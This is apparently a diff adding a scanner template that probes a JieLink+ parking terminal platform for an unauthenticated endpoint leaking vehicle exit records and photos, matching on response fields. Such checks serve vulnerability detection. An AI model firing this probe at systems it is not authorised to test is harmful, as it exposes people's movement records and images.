@@ -1,0 +1,27 @@
+id: poc-yaml-jielink-plus-parkoutrecord-info-leak
+info:
+  name: JieLink+ Intelligent Terminal Platform ParkOutRecord Info Leak
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: info-leak
+http:
+  - method: GET
+    path:
+      - /report/ParkOutRecord/GetDataList
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"OutRecordID\":"
+          - "\"EnterDeviceName\":"
+          - "\"OutPicture\":"
+          - "\"EnterPicture\":"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
